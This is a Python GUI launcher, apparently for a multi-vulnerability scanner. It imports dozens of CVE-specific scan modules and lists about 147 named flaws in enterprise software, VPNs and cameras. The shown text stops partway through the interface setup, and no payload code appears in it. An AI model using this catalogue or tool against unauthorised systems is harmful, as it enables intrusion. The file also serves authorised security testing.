from __future__ import print_function
import base64
import ssl
import time
import tkinter as tk
from os.path import normpath
from tkinter import filedialog, messagebox, Toplevel, Checkbutton, IntVar
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import vulnerability_scanner.sql_injection_scan as sql_injection_scan
import vulnerability_scanner.zealot_oa_scan as zealot_oa_scan
import vulnerability_scanner.JeePlus_validateMobile_SQL_scan as JeePlus_validateMobile_SQL_scan
import vulnerability_scanner.Zhiyuan_OA_pwd_reset_vul_scan as Zhiyuan_OA_pwd_reset_vul_scan
import vulnerability_scanner.youdian_CMS_upload_vul_scan as youdian_CMS_upload_vul_scan
import vulnerability_scanner.Ivanti_VPN_RCE_scan as Ivanti_VPN_RCE_scan
import vulnerability_scanner.Jeecg_commonController_file_upload_scan as Jeecg_commonController_file_upload_scan
import vulnerability_scanner.bang_CRM_JILIYU_sql_scan as bang_CRM_JILIYU_sql_scan
import vulnerability_scanner.CVE_2024_27198_scan as CVE_2024_27198_scan
import vulnerability_scanner.SpringBlade_errorlist_SQL_scan as SpringBlade_errorlist_SQL_scan
import vulnerability_scanner.XVE_2023_23744_scan as XVE_2023_23744_scan
import vulnerability_scanner.ChatGPT_Next_Web_XSS_CVE_2023_49785_scan as ChatGPT_Next_Web_XSS_CVE_2023_49785_scan
import vulnerability_scanner.CVE_2024_2022_scan as CVE_2024_2022_scan
import vulnerability_scanner.Lanling_EIS_SQL_vul_scan as Lanling_EIS_SQL_vul_scan
import vulnerability_scanner.Tongtianxing_CMSV6_vehicle_video_scan as Tongtianxing_CMSV6_vehicle_video_scan
import vulnerability_scanner.Glodon_Linkworks_GetAllData_information_scan as Glodon_Linkworks_GetAllData_information_scan
import vulnerability_scanner.Dahua_QVD_2023_45063_scan as Dahua_QVD_2023_45063_scan
import vulnerability_scanner.Youdian_CMS_GetSpecial_SQL_vul_scan as Youdian_CMS_GetSpecial_SQL_vul_scan
import vulnerability_scanner.CERIO_DT_Series_Router_Command_Vul_scan as CERIO_DT_Series_Router_Command_Vul_scan
import vulnerability_scanner.WordPres_Bricks_Builder_scan as WordPres_Bricks_Builder_scan
import vulnerability_scanner.Yongyou_getApp_SQL_scan as Yongyou_getApp_SQL_scan
import vulnerability_scanner.Byzoro_Smart_Management_upload_scan as Byzoro_Smart_Management_upload_scan
import vulnerability_scanner.Uniview_video_surveillance_scan as Uniview_video_surveillance_scan
import vulnerability_scanner.Telesquare_TLR_2005Ksh_scan as Telesquare_TLR_2005Ksh_scan
import vulnerability_scanner.ANHENG_Mingyu_security_gateway_file_upload_scan as ANHENG_Mingyu_security_gateway_file_upload_scan
import vulnerability_scanner.Dahua_DSS_system_itcBulletin_SQL_injection_scan as Dahua_DSS_system_itcBulletin_SQL_injection_scan
import vulnerability_scanner.NSFOCUS_bastionhost_privileges_scan as NSFOCUS_bastionhost_privileges_scan
import vulnerability_scanner.SpringBlade_Export_user_SQL_scan as SpringBlade_Export_user_SQL_scan
import vulnerability_scanner.XMall_Open_Marketplace_SQL_Injection_scan as XMall_Open_Marketplace_SQL_Injection_scan
import vulnerability_scanner.Multiple_gateway_security_devices_scan as Multiple_gateway_security_devices_scan
import vulnerability_scanner.Altenergy_Power_System_Control_scan as Altenergy_Power_System_Control_scan
import vulnerability_scanner.yikatong_ailianyun_scan as yikatong_ailianyun_scan
import vulnerability_scanner.Hikvision_Operation_Management_Center_scan as Hikvision_Operation_Management_Center_scan
import vulnerability_scanner.Junos_webauth_operation_upload_scan as Junos_webauth_operation_upload_scan
import vulnerability_scanner.Telesquare_TLR_2005Ksh_RCE_scan as Telesquare_TLR_2005Ksh_RCE_scan
import vulnerability_scanner.HWL_2511_SSpopencgi_Command_scan as HWL_2511_SSpopencgi_Command_scan
import vulnerability_scanner.NUUO_camera_command_scan as NUUO_camera_command_scan
import vulnerability_scanner.Likeshop_File_upload_vuln_scan as Likeshop_File_upload_vuln_scan
import vulnerability_scanner.Toseiweb_network_test_Command_scan as Toseiweb_network_test_Command_scan
import vulnerability_scanner.SFDI_Security_Management_System_test_qrcode_b_Command_Vuln_Scan as Scan_SFDI_Security_Management_System_test_qrcode_b_Command_Vuln
from urllib.parse import urljoin, quote
from urllib.parse import urlsplit, urlunsplit
from urllib.parse import urlencode, unquote
from flask_unsign import session
from time import sleep
import random
import string
from tkinter import scrolledtext
import threading
import json
import requests
import argparse
from colorama import init, Fore
from urllib.parse import urlparse
from requests.exceptions import Timeout
import json
import urllib3
import urllib
from itertools import cycle
from Crypto.Cipher import AES
import hashlib
import re
import xml.etree.ElementTree as ET
import os
import binascii
import socket
import struct
import sys
import threading
#import tableprint as tp
import json
import requests
import argparse

from vulnerability_scanner import SFDI_Security_Management_System_test_qrcode_b_Command_Vuln_Scan

version_list = ["V3_0_0_SNAPSHOT","V3_0_0_ALPHA1","V3_0_0_BETA1","V3_0_0_BETA2","V3_0_0_BETA3","V3_0_0_BETA4","V3_0_0_BETA5","V3_0_0_BETA6_SNAPSHOT","V3_0_0_BETA6","V3_0_0_BETA7_SNAPSHOT","V3_0_0_BETA7","V3_0_0_BETA8_SNAPSHOT","V3_0_0_BETA8","V3_0_0_BETA9_SNAPSHOT","V3_0_0_BETA9","V3_0_0_FINAL","V3_0_1_SNAPSHOT","V3_0_1","V3_0_2_SNAPSHOT","V3_0_2","V3_0_3_SNAPSHOT","V3_0_3","V3_0_4_SNAPSHOT","V3_0_4","V3_0_5_SNAPSHOT","V3_0_5","V3_0_6_SNAPSHOT","V3_0_6","V3_0_7_SNAPSHOT","V3_0_7","V3_0_8_SNAPSHOT","V3_0_8","V3_0_9_SNAPSHOT","V3_0_9","V3_0_10_SNAPSHOT","V3_0_10","V3_0_11_SNAPSHOT","V3_0_11","V3_0_12_SNAPSHOT","V3_0_12","V3_0_13_SNAPSHOT","V3_0_13","V3_0_14_SNAPSHOT","V3_0_14","V3_0_15_SNAPSHOT","V3_0_15","V3_1_0_SNAPSHOT","V3_1_0","V3_1_1_SNAPSHOT","V3_1_1","V3_1_2_SNAPSHOT","V3_1_2","V3_1_3_SNAPSHOT","V3_1_3","V3_1_4_SNAPSHOT","V3_1_4","V3_1_5_SNAPSHOT","V3_1_5","V3_1_6_SNAPSHOT","V3_1_6","V3_1_7_SNAPSHOT","V3_1_7","V3_1_8_SNAPSHOT","V3_1_8","V3_1_9_SNAPSHOT","V3_1_9","V3_2_0_SNAPSHOT","V3_2_0","V3_2_1_SNAPSHOT","V3_2_1","V3_2_2_SNAPSHOT","V3_2_2","V3_2_3_SNAPSHOT","V3_2_3","V3_2_4_SNAPSHOT","V3_2_4","V3_2_5_SNAPSHOT","V3_2_5","V3_2_6_SNAPSHOT","V3_2_6","V3_2_7_SNAPSHOT","V3_2_7","V3_2_8_SNAPSHOT","V3_2_8","V3_2_9_SNAPSHOT","V3_2_9","V3_3_1_SNAPSHOT","V3_3_1","V3_3_2_SNAPSHOT","V3_3_2","V3_3_3_SNAPSHOT","V3_3_3","V3_3_4_SNAPSHOT","V3_3_4","V3_3_5_SNAPSHOT","V3_3_5","V3_3_6_SNAPSHOT","V3_3_6","V3_3_7_SNAPSHOT","V3_3_7","V3_3_8_SNAPSHOT","V3_3_8","V3_3_9_SNAPSHOT","V3_3_9","V3_4_1_SNAPSHOT","V3_4_1","V3_4_2_SNAPSHOT","V3_4_2","V3_4_3_SNAPSHOT","V3_4_3","V3_4_4_SNAPSHOT","V3_4_4","V3_4_5_SNAPSHOT","V3_4_5","V3_4_6_SNAPSHOT","V3_4_6","V3_4_7_SNAPSHOT","V3_4_7","V3_4_8_SNAPSHOT","V3_4_8","V3_4_9_SNAPSHOT","V3_4_9","V3_5_1_SNAPSHOT","V3_5_1","V3_5_2_SNAPSHOT","V3_5_2","V3_5_3_SNAPSHOT","V3_5_3","V3_5_4_SNAPSHOT","V3_5_4","V3_5_5_SNAPSHOT","V3_5_5","V3_5_6_SNAPSHOT","V3_5_6","V3_5_7_SNAPSHOT","V3_5_7","V3_5_8_SNAPSHOT","V3_5_8","V3_5_9_SNAPSHOT","V3_5_9","V3_6_1_SNAPSHOT","V3_6_1","V3_6_2_SNAPSHOT","V3_6_2","V3_6_3_SNAPSHOT","V3_6_3","V3_6_4_SNAPSHOT","V3_6_4","V3_6_5_SNAPSHOT","V3_6_5","V3_6_6_SNAPSHOT","V3_6_6","V3_6_7_SNAPSHOT","V3_6_7","V3_6_8_SNAPSHOT","V3_6_8","V3_6_9_SNAPSHOT","V3_6_9","V3_7_1_SNAPSHOT","V3_7_1","V3_7_2_SNAPSHOT","V3_7_2","V3_7_3_SNAPSHOT","V3_7_3","V3_7_4_SNAPSHOT","V3_7_4","V3_7_5_SNAPSHOT","V3_7_5","V3_7_6_SNAPSHOT","V3_7_6","V3_7_7_SNAPSHOT","V3_7_7","V3_7_8_SNAPSHOT","V3_7_8","V3_7_9_SNAPSHOT","V3_7_9","V3_8_1_SNAPSHOT","V3_8_1","V3_8_2_SNAPSHOT","V3_8_2","V3_8_3_SNAPSHOT","V3_8_3","V3_8_4_SNAPSHOT","V3_8_4","V3_8_5_SNAPSHOT","V3_8_5","V3_8_6_SNAPSHOT","V3_8_6","V3_8_7_SNAPSHOT","V3_8_7","V3_8_8_SNAPSHOT","V3_8_8","V3_8_9_SNAPSHOT","V3_8_9","V3_9_1_SNAPSHOT","V3_9_1","V3_9_2_SNAPSHOT","V3_9_2","V3_9_3_SNAPSHOT","V3_9_3","V3_9_4_SNAPSHOT","V3_9_4","V3_9_5_SNAPSHOT","V3_9_5","V3_9_6_SNAPSHOT","V3_9_6","V3_9_7_SNAPSHOT","V3_9_7","V3_9_8_SNAPSHOT","V3_9_8","V3_9_9_SNAPSHOT","V3_9_9","V4_0_0_SNAPSHOT","V4_0_0","V4_0_1_SNAPSHOT","V4_0_1","V4_0_2_SNAPSHOT","V4_0_2","V4_0_3_SNAPSHOT","V4_0_3","V4_0_4_SNAPSHOT","V4_0_4","V4_0_5_SNAPSHOT","V4_0_5","V4_0_6_SNAPSHOT","V4_0_6","V4_0_7_SNAPSHOT","V4_0_7","V4_0_8_SNAPSHOT","V4_0_8","V4_0_9_SNAPSHOT","V4_0_9","V4_1_0_SNAPSHOT","V4_1_0","V4_1_1_SNAPSHOT","V4_1_1","V4_1_2_SNAPSHOT","V4_1_2","V4_1_3_SNAPSHOT","V4_1_3","V4_1_4_SNAPSHOT","V4_1_4","V4_1_5_SNAPSHOT","V4_1_5","V4_1_6_SNAPSHOT","V4_1_6","V4_1_7_SNAPSHOT","V4_1_7","V4_1_8_SNAPSHOT","V4_1_8","V4_1_9_SNAPSHOT","V4_1_9","V4_2_0_SNAPSHOT","V4_2_0","V4_2_1_SNAPSHOT","V4_2_1","V4_2_2_SNAPSHOT","V4_2_2","V4_2_3_SNAPSHOT","V4_2_3","V4_2_4_SNAPSHOT","V4_2_4","V4_2_5_SNAPSHOT","V4_2_5","V4_2_6_SNAPSHOT","V4_2_6","V4_2_7_SNAPSHOT","V4_2_7","V4_2_8_SNAPSHOT","V4_2_8","V4_2_9_SNAPSHOT","V4_2_9","V4_3_0_SNAPSHOT","V4_3_0","V4_3_1_SNAPSHOT","V4_3_1","V4_3_2_SNAPSHOT","V4_3_2","V4_3_3_SNAPSHOT","V4_3_3","V4_3_4_SNAPSHOT","V4_3_4","V4_3_5_SNAPSHOT","V4_3_5","V4_3_6_SNAPSHOT","V4_3_6","V4_3_7_SNAPSHOT","V4_3_7","V4_3_8_SNAPSHOT","V4_3_8","V4_3_9_SNAPSHOT","V4_3_9","V4_4_0_SNAPSHOT","V4_4_0","V4_4_1_SNAPSHOT","V4_4_1","V4_4_2_SNAPSHOT","V4_4_2","V4_4_3_SNAPSHOT","V4_4_3","V4_4_4_SNAPSHOT","V4_4_4","V4_4_5_SNAPSHOT","V4_4_5","V4_4_6_SNAPSHOT","V4_4_6","V4_4_7_SNAPSHOT","V4_4_7","V4_4_8_SNAPSHOT","V4_4_8","V4_4_9_SNAPSHOT","V4_4_9","V4_5_0_SNAPSHOT","V4_5_0","V4_5_1_SNAPSHOT","V4_5_1","V4_5_2_SNAPSHOT","V4_5_2","V4_5_3_SNAPSHOT","V4_5_3","V4_5_4_SNAPSHOT","V4_5_4","V4_5_5_SNAPSHOT","V4_5_5","V4_5_6_SNAPSHOT","V4_5_6","V4_5_7_SNAPSHOT","V4_5_7","V4_5_8_SNAPSHOT","V4_5_8","V4_5_9_SNAPSHOT","V4_5_9","V4_6_0_SNAPSHOT","V4_6_0","V4_6_1_SNAPSHOT","V4_6_1","V4_6_2_SNAPSHOT","V4_6_2","V4_6_3_SNAPSHOT","V4_6_3","V4_6_4_SNAPSHOT","V4_6_4","V4_6_5_SNAPSHOT","V4_6_5","V4_6_6_SNAPSHOT","V4_6_6","V4_6_7_SNAPSHOT","V4_6_7","V4_6_8_SNAPSHOT","V4_6_8","V4_6_9_SNAPSHOT","V4_6_9","V4_7_0_SNAPSHOT","V4_7_0","V4_7_1_SNAPSHOT","V4_7_1","V4_7_2_SNAPSHOT","V4_7_2","V4_7_3_SNAPSHOT","V4_7_3","V4_7_4_SNAPSHOT","V4_7_4","V4_7_5_SNAPSHOT","V4_7_5","V4_7_6_SNAPSHOT","V4_7_6","V4_7_7_SNAPSHOT","V4_7_7","V4_7_8_SNAPSHOT","V4_7_8","V4_7_9_SNAPSHOT","V4_7_9","V4_8_0_SNAPSHOT","V4_8_0","V4_8_1_SNAPSHOT","V4_8_1","V4_8_2_SNAPSHOT","V4_8_2","V4_8_3_SNAPSHOT","V4_8_3","V4_8_4_SNAPSHOT","V4_8_4","V4_8_5_SNAPSHOT","V4_8_5","V4_8_6_SNAPSHOT","V4_8_6","V4_8_7_SNAPSHOT","V4_8_7","V4_8_8_SNAPSHOT","V4_8_8","V4_8_9_SNAPSHOT","V4_8_9","V4_9_0_SNAPSHOT","V4_9_0","V4_9_1_SNAPSHOT","V4_9_1","V4_9_2_SNAPSHOT","V4_9_2","V4_9_3_SNAPSHOT","V4_9_3","V4_9_4_SNAPSHOT","V4_9_4","V4_9_5_SNAPSHOT","V4_9_5","V4_9_6_SNAPSHOT","V4_9_6","V4_9_7_SNAPSHOT","V4_9_7","V4_9_8_SNAPSHOT","V4_9_8","V4_9_9_SNAPSHOT","V4_9_9","V5_0_0_SNAPSHOT","V5_0_0","V5_0_1_SNAPSHOT","V5_0_1","V5_0_2_SNAPSHOT","V5_0_2","V5_0_3_SNAPSHOT","V5_0_3","V5_0_4_SNAPSHOT","V5_0_4","V5_0_5_SNAPSHOT","V5_0_5","V5_0_6_SNAPSHOT","V5_0_6","V5_0_7_SNAPSHOT","V5_0_7","V5_0_8_SNAPSHOT","V5_0_8","V5_0_9_SNAPSHOT","V5_0_9","V5_1_0_SNAPSHOT","V5_1_0","V5_1_1_SNAPSHOT","V5_1_1","V5_1_2_SNAPSHOT","V5_1_2","V5_1_3_SNAPSHOT","V5_1_3","V5_1_4_SNAPSHOT","V5_1_4","V5_1_5_SNAPSHOT","V5_1_5","V5_1_6_SNAPSHOT","V5_1_6","V5_1_7_SNAPSHOT","V5_1_7","V5_1_8_SNAPSHOT","V5_1_8","V5_1_9_SNAPSHOT","V5_1_9","V5_2_0_SNAPSHOT","V5_2_0","V5_2_1_SNAPSHOT","V5_2_1","V5_2_2_SNAPSHOT","V5_2_2","V5_2_3_SNAPSHOT","V5_2_3","V5_2_4_SNAPSHOT","V5_2_4","V5_2_5_SNAPSHOT","V5_2_5","V5_2_6_SNAPSHOT","V5_2_6","V5_2_7_SNAPSHOT","V5_2_7","V5_2_8_SNAPSHOT","V5_2_8","V5_2_9_SNAPSHOT","V5_2_9","V5_3_0_SNAPSHOT","V5_3_0","V5_3_1_SNAPSHOT","V5_3_1","V5_3_2_SNAPSHOT","V5_3_2","V5_3_3_SNAPSHOT","V5_3_3","V5_3_4_SNAPSHOT","V5_3_4","V5_3_5_SNAPSHOT","V5_3_5","V5_3_6_SNAPSHOT","V5_3_6","V5_3_7_SNAPSHOT","V5_3_7","V5_3_8_SNAPSHOT","V5_3_8","V5_3_9_SNAPSHOT","V5_3_9","V5_4_0_SNAPSHOT","V5_4_0","V5_4_1_SNAPSHOT","V5_4_1","V5_4_2_SNAPSHOT","V5_4_2","V5_4_3_SNAPSHOT","V5_4_3","V5_4_4_SNAPSHOT","V5_4_4","V5_4_5_SNAPSHOT","V5_4_5","V5_4_6_SNAPSHOT","V5_4_6","V5_4_7_SNAPSHOT","V5_4_7","V5_4_8_SNAPSHOT","V5_4_8","V5_4_9_SNAPSHOT","V5_4_9","V5_5_0_SNAPSHOT","V5_5_0","V5_5_1_SNAPSHOT","V5_5_1","V5_5_2_SNAPSHOT","V5_5_2","V5_5_3_SNAPSHOT","V5_5_3","V5_5_4_SNAPSHOT","V5_5_4","V5_5_5_SNAPSHOT","V5_5_5","V5_5_6_SNAPSHOT","V5_5_6","V5_5_7_SNAPSHOT","V5_5_7","V5_5_8_SNAPSHOT","V5_5_8","V5_5_9_SNAPSHOT","V5_5_9","V5_6_0_SNAPSHOT","V5_6_0","V5_6_1_SNAPSHOT","V5_6_1","V5_6_2_SNAPSHOT","V5_6_2","V5_6_3_SNAPSHOT","V5_6_3","V5_6_4_SNAPSHOT","V5_6_4","V5_6_5_SNAPSHOT","V5_6_5","V5_6_6_SNAPSHOT","V5_6_6","V5_6_7_SNAPSHOT","V5_6_7","V5_6_8_SNAPSHOT","V5_6_8","V5_6_9_SNAPSHOT","V5_6_9","V5_7_0_SNAPSHOT","V5_7_0","V5_7_1_SNAPSHOT","V5_7_1","V5_7_2_SNAPSHOT","V5_7_2","V5_7_3_SNAPSHOT","V5_7_3","V5_7_4_SNAPSHOT","V5_7_4","V5_7_5_SNAPSHOT","V5_7_5","V5_7_6_SNAPSHOT","V5_7_6","V5_7_7_SNAPSHOT","V5_7_7","V5_7_8_SNAPSHOT","V5_7_8","V5_7_9_SNAPSHOT","V5_7_9","V5_8_0_SNAPSHOT","V5_8_0","V5_8_1_SNAPSHOT","V5_8_1","V5_8_2_SNAPSHOT","V5_8_2","V5_8_3_SNAPSHOT","V5_8_3","V5_8_4_SNAPSHOT","V5_8_4","V5_8_5_SNAPSHOT","V5_8_5","V5_8_6_SNAPSHOT","V5_8_6","V5_8_7_SNAPSHOT","V5_8_7","V5_8_8_SNAPSHOT","V5_8_8","V5_8_9_SNAPSHOT","V5_8_9","V5_9_0_SNAPSHOT","V5_9_0","V5_9_1_SNAPSHOT","V5_9_1","V5_9_2_SNAPSHOT","V5_9_2","V5_9_3_SNAPSHOT","V5_9_3","V5_9_4_SNAPSHOT","V5_9_4","V5_9_5_SNAPSHOT","V5_9_5","V5_9_6_SNAPSHOT","V5_9_6","V5_9_7_SNAPSHOT","V5_9_7","V5_9_8_SNAPSHOT","V5_9_8","V5_9_9_SNAPSHOT","V5_9_9","HIGHER_VERSION"]

init()


class VulnDetection:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("kuki的小铲子")
        self.root.geometry("1000x800")  # 设置窗口大小为800x600
        self.vulnerabilities = [
            "147.Jeecg commonController 任意文件上传漏洞",
            "146.友点CMS image_upload.php 文件上传",
            "145.致远OA ucpcLogin存在密码重置漏洞",
            "144.ChatGPT-Next-Web XSS漏洞复现(CVE-2023-49785)",
            "143.JeePlus快速开发平台 validateMobile SQL注入",
            "142.SpringBlade errorlist SQL报错注入",
            "141.帮管客 CRM jiliyu SQL注入漏洞",
            "140.通天星CMSV6车载定位监控平台 SQL注入漏洞(XVE-2023-23744)",
            "139.JetBrains TeamCity 身份验证绕过漏洞(CVE-2024-27198)",
            "138.网康科技 NS-ASG 应用安全网关 SQL注入漏洞(CVE-2024-2022)",
            "137.蓝凌EIS智慧协同平台 rpt_listreport_defi露漏洞nefield.aspx SQL注入漏洞",
            "136.广联达Linkworks GetAllData 信息泄",
            "135.通天星CMSV6 车载视频监控平台 信息泄露漏洞",
            "134.WordPres Bricks Builder 前台RCE漏洞(CVE-2024-25600)",
            "133.友点CMS GetSpecial SQL注入漏洞",
            "132.CERIO DT系列路由器命令执行漏洞",
            "131.XMall开源商城SQL注入漏洞(CVE-2024-24112)",
            "130.百卓Smart管理平台uploadfile.php文件上传漏洞(CVE-2024-0939)",
            "129.大华智能物联综合管理平台 任意文件读取漏洞",
            "128.用友移动管理系统 getApp SQL注入漏洞",
            "127.Ivanti VPN RCE漏洞(CVE-2024-21887)",
            "126.SpringBlade export-user SQL注入漏洞",
            "125.安恒明御安全网关 aaa_local_web_preview文件上传漏洞",
            "124.大华 DSS 数字监控系统 itcBulletin SQL 注入漏洞",
            "123.绿盟 SAS堡垒机 local_user.php 权限绕过漏洞",
            "122.宇视科技视频监控 main-cgi 文件信息泄露漏洞",
            "121.多家网关-安全设备存在远程命令执行漏洞",
            "120.Altenergy电力系统控制软件 RCE漏洞",
            "119.海康运行管理中心 RCE漏洞",
            "118.泛微E-Office SQL注入漏洞综合扫描",
            "117.Junos webauth_operation.php 文件上传漏洞(CVE-2023-36844)",
            "116.Telesquare TLR-2005Ksh 路由器 RCE漏洞",
            "115.NUUO摄像头远程命令执行漏洞",
            "114.Toseiweb管理端network_test.php参数远程命令执行漏洞",
            "113.likeshop单商户商城系统任意文件上传漏洞",
            "112.HWL-2511-SSpopen.cgi命令执行漏洞",
            "111.思福迪 运维安全管理系统 test_qrcode_b 远程命令执行漏洞",
            "110.Telesquare TLR-2005Ksh 路由器 getUsernamePassword 信息泄露",
            "109.优卡特脸爱云一脸通智慧管理平台权限绕过漏洞(CVE-2023-6099)",
            "108.XETUX软件dynamiccontent.properties.xhtml远程代码执行漏洞",
            "107.IP-guard Webserver view 远程命令执行漏洞",
            "106.泛微e-Weaver SQL注入",
            "105.奇安信360天擎getsimilarlist存在SQL注入漏洞",
            "104.Confluence未授权管理用户添加 (CVE-2023-22515)",
            "103.致远OA wpsAssistServlet接口存在任意文件上传漏洞",
            "102.致远oa前台密码修改(QVD-2023-21704)",
            "101.用友GRP-U8 SQL注入漏洞POST型",
            "100.用友GRP-U8 SQL注入漏洞GET型",
            "99.华测监测预警系统存在sql注入漏洞",
            "98.金和OA前台任意文件上传漏洞",
            "97.H2db console 未授权访问漏洞",
            "96.安恒信息明御安全网关存在任意文件上传漏洞",
            "95.安美数字酒店宽带运营系统SQL注入漏洞",
            "94.泛微e-office系统存在SQL注入漏洞",
            "93.蓝凌EIS智慧协同平台saveImg接口任意文件上传漏洞",
            "92.EasyCVR 视频管理平台存在信息泄露",
            "91.成都海翔软件有限公司海翔药业云平台存在sql注入",
            "1.宏景HCM categories SQL注入(CNVD-2023-08743)",
            "2.蓝凌OA存在任意文件读取漏洞(CNVD-2021-28277)",
            "3.motionEye应用程序信息泄露漏洞(CVE-2022-25568)",
            "4.泛微e8任意用户登录漏洞",
            "5.泛微e-cology9 SQL注入漏洞(QVD-2023-5012)",
            "6.畅捷通CRM SQL注入漏洞",
            "7.畅捷通T + SQL注入漏洞(QVD-2023-13612)",
            "8.GeoServer SQL注入漏洞(CVE-2023-25157)",
            "9.Smartbi内置用户登陆绕过漏洞",
            "10.金蝶云星空RCE漏洞",
            "11.Openfire身份认证绕过漏洞(CVE-2023-32315)",
            "12.海康威视iVMS综合安防系统任意文件上传漏洞",
            "13.泛微 E-Office文件上传漏洞复现(CVE-2023-2523)",
            "14.泛微 E-Office文件上传漏洞复现(CVE-2023-2648)",
            "15.HIKVISION-视频监控(CVE-2017-7921)",
            "16.shopxo文件读取(CNVD-2021-15822)",
            "17.weblogicRCE(CVE-2023-21839)",
            "18.Chamilo学习管理软件存在命令执行漏洞(CVE-2023-34960)",
            "19.华夏ERP敏感信息泄露漏洞(CNVD-2020-63964)",
            "20.Joomla存在未授权访问漏洞(CVE-2023-23752)",
            "21.nginx WebUI Cmd远程命令执行漏洞",
            "22.中新金盾信息安全管理系统默认口令",
            "23.Hasura GraphQL Engine远程命令执行漏洞",
            "24.Apache Superset未授权访问漏洞(CVE-2023-27524)",
            "25.深信服EDR命令执行(CNVD-2020-46552)",
            "26.Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)",
            "27.HIKVISION-海康威视isecure center 综合安防管理平台任意文件上传漏洞",
            "28.PowerJob未授权访问漏洞(CVE-2023-29922)",
            "29.浙江宇视科技 网络视频录像机远程命令执行漏洞",
            "30.华平信息AVCON6系统管理平台strut2远程代码执行漏洞",
            "31.Joomla3.7Corecom_fields组件sql注入漏洞(CVE-2017-8917)",
            "32.狮子鱼CMS",
            "33.新开普智慧校园系统RCE漏洞",
            "34.SPIP远程代码执行漏洞(CVE-2023-27372)",
            "35.Apache RocketMQ远程命令执行漏洞(CVE-2023-37582)",
            "36.大华智慧园区综合管理平台RCE漏洞",
            "37.艾科思应用接入系统存在任意文件读取漏洞",
            "38.SCM Manager XSS漏洞(CVE-2023-33829)",
            "39.金蝶云星空管理中心存在反序列化命令执行",
            "40.Gibbon CVE-2023-34598",
            "41.泛微E-Cology SQL注入漏洞复现(QVD-2023-15672)",
            "42.用友NC Cloud存在前台远程命令执行漏洞",
            "43.HIKVISION-海康威视综合安防管理平台远程命令执行漏洞(Fastjson)",
            "44.宏景eHR 任意文件上传漏洞",
            "45.用友GRP-U8 存在任意文件上传漏洞",
            "46.畅捷通TPlus DownloadProxy.aspx 存在任意文件读取漏洞",
            "47.Metabase RCE漏洞(CVE-2023-38646)",
            "48.用友时空KSOA软件前台文件上传漏洞",
            "49.金蝶云星空任意文件读取漏洞",
            "50.通达OA SQL注入漏洞(CVE-2023-4165)",
            "51.通达OA SQL注入漏洞(CVE-2023-4166)",
            "52.绿盟sas安全审计系统任意文件读取漏洞",
            "53.网神 SecGate 3600 防火墙任意文件上传漏洞",
            "54.大华智慧园区综合管理平台SQL注入漏洞",
            "55.金和OA C6-GetSqlData.aspx SQL注入漏洞",
            "56.用友-NC-Cloud远程代码执行漏洞",
            "57.广联达 Linkworks办公OA SQL注入漏洞",
            "58.企业微信0daysecret漏洞",
            "59.用友时空KSOA SQL注入漏洞",
            "60.任我行CRM系统 SQL注入漏洞",
            "61.用友移动管理系统 任意文件上传漏洞",
            "62.亿赛通电子文档安全管理系统任意文件上传漏洞",
            "63.企望制造ERP系统 RCE漏洞",
            "64.契约锁电子章系统漏洞",
            "65.金盘 微信管理平台 未授权访问漏洞",
            "66.绿盟 SAS堡垒机 GetFile 任意文件读取漏洞",
            "67.深信服 SG上网优化管理系统 任意文件读取漏洞",
            "68.亿赛通电子文档安全管理系统RCE漏洞",
            "70.时空智友企业流程化管控系统文件上传漏洞",
            "71.易思智能物流无人值守系统文件上传漏洞",
            "72.明源云ERP系统 接口管家ApiUpdate.ashx任意文件上传漏洞",
            "73.DVR(此漏洞输入框兼容性故障，暂不可使用)",
            "75.CVE-2021-29490",
            "76.网御ACM上网行为管理系统SQL注入漏洞",
            "77.MeterSphere customMethod 远程命令执行漏洞",
            "78.致远OA_M1Server_userTokenService远程命令执行漏洞",
            "79.光伏发电测量系统目录遍历漏洞(CVE-2023-40924)",
            "80.wordpress任意文件上传漏洞",
            "81.JumpServer Session 未授权访问漏洞(CVE-2023-42442)",
            "82.通达OA v2017 action_upload.php 任意文件上传漏洞",
            "83.Craft CMS 远程代码执行漏洞(CVE-2023-41892)",
            "84.用友U8 crm客户关系管理存在任意文件上传漏洞",
            "85.万户ezOFFICE存在未授权访问漏洞",
            "86.用友移动管理系统存在任意文件上传漏洞",
            "87.致远OA resetPassword任意用户密码修改漏洞",
            "88.Juniper Networks Junos OS EX远程命令执行漏洞(CVE-2023-36845)",
            "89.华测监测预警系统 2.2 存在任意文件读取漏洞",
            "90.金蝶EAS、EAS Cloud远程代码执行漏洞",
            # 添加其他漏洞选项
        ]

        self.vars = []  # 存储选择框的变量

        self.create_menu()
        self.create_input_text()
        self.create_output_text()
        self.create_buttons()
        self.proxies_var = IntVar()
        self.proxies_var.set(0)
        self.proxies = None
        self.output_file_path = ""

        self.root.mainloop()

    def create_menu(self):
        menu_bar = tk.Menu(self.root)
        self.root.config(menu=menu_bar)

        file_menu = tk.Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="选择文件", command=self.select_file)
        file_menu.add_command(label="保存输出结果", command=self.save_output)
        file_menu.add_separator()
        file_menu.add_command(label="退出", command=self.root.quit)

        menu_bar.add_cascade(label="文件", menu=file_menu)

        vulnerabilities_menu = tk.Menu(menu_bar, tearoff=0)
        vulnerabilities_menu.add_command(label="漏洞库", command=self.open_vulnerabilities_window)

        menu_bar.add_cascade(label="漏洞", menu=vulnerabilities_menu)

    def create_input_text(self):
        self.input_frame = tk.Frame(self.root)
        self.input_frame.pack()

        self.file_label = tk.Label(self.input_frame, text="文件路径：")
        self.file_label.pack(side=tk.LEFT)

        self.file_entry = tk.Entry(self.input_frame, width=50)
        self.file_entry.pack(side=tk.LEFT)

    # def create_output_text(self):
    #     self.output_text = tk.Text(self.root, bg="black", fg="white", state=tk.DISABLED)
    #     self.output_text.pack(fill=tk.BOTH, expand=True)
    #
    #      # 创建滚动条并绑定到文本框
    #     scroll_bar = tk.Scrollbar(self.root, command=self.output_text.yview)
    #     scroll_bar.pack(side=tk.RIGHT, fill=tk.Y)
    #     self.output_text.configure(yscrollcommand=scroll_bar.set)
    #
    #     # 设置输出文本框的样式
    #     #self.output_text.tag_configure("red", foreground="#FF0000")
    #     self.output_text.tag_configure("red", foreground="#FF0000", font=("Helvetica", "12", "bold"))
    #     self.output_text.tag_configure("green", foreground="#00FF00")
    #     self.output_text.tag_configure("yellow", foreground="yellow")

    def create_output_text(self):
        self.output_text = tk.Text(self.root, bg="black", fg="white", state=tk.DISABLED, font=("Helvetica", 14))
        self.output_text.pack(fill=tk.BOTH, expand=True)

        # Create a scrollbar and bind it to the text box
        scroll_bar = tk.Scrollbar(self.root, command=self.output_text.yview)
